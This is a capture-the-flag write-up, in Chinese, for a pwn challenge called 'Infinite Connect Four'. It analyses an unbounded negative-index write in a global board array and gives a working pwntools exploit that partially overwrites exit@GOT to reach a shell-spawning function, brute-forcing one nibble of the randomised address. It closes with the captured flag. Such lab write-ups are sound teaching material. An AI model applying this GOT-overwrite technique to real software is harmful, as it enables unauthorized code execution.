# Infinite Connect Four

## 题目简述

题目实现了一个全局 `board[8][8]` 的四子棋。某列填满后，程序试图把整列向下移动，但从 `lastfree = 0` 开始向负方向寻找空位，完全没有边界检查。棋盘位于 PIE 程序的 `.bss`，其前方可以触及 GOT；二进制为 Partial RELRO，因此可通过选定玩家棋子字节和落子顺序覆盖 `exit@GOT`，再用非法列号触发 `exit`。

## 解题过程

满列分支中的漏洞如下：

```c
int lastfree = 0;
while (board[lastfree][colint] == player1symbol ||
       board[lastfree][colint] == player2symbol) {
    lastfree--;
}
```

当棋盘前方内存中的字节恰好等于任一玩家符号时，`lastfree` 会持续变成负数；后续列移动把可控棋子写到 `board` 之前。官方布局中，目标是把 `exit@GOT` 指针的低位改成 `win`。

PIE/ASLR 以页为单位随机化，因此 `win` 的低 12 位固定为 `0xfc9`。攻击把目标指针低字节写成 `0xc9`，并把第二字节写成 `0x5f`。第二字节的低半字节 `f` 是固定目标偏移，高半字节仍取决于随机基址，所以每次连接约有 $1/16$ 的成功概率。

官方落子序列如下：

```python
from pwn import process


def choose(column: int) -> None:
    io.sendlineafter(b"column (0 - 7) > ", str(column).encode())


while True:
    io = process("./infinite_connect_four")
    io.sendlineafter(b"> ", b"\x5f")
    io.sendlineafter(b"> ", b"\xc9")

    for _ in range(16):
        choose(1)
    choose(2)
    for _ in range(16):
        choose(0)

    choose(9)  # 非法列号，触发 exit(1)
    io.sendline(b"cat flag.txt")
    result = io.recvrepeat(0.5)
    if b"grey{" in result:
        print(result.decode(errors="replace"))
        break
    io.close()
```

当随机高半字节匹配时，`exit` 的间接调用进入 `win`，后者执行 `/bin/sh`，得到：

```text
grey{i_l0v3_mE_s0M3_bUfFeR_0v3rFloWS}
```

## 方法总结

- 核心技巧：把全局二维数组的负索引写转化为 Partial RELRO 下的 GOT 覆盖。
- 识别信号：满容器时“寻找前一个空位”的循环若只有内容条件、没有索引下界，容易向对象前方越界。
- 复用要点：PIE 并不随机化页内偏移；若只能覆盖部分指针，可以保留稳定的低 12 位并对相邻随机半字节做有界重试。
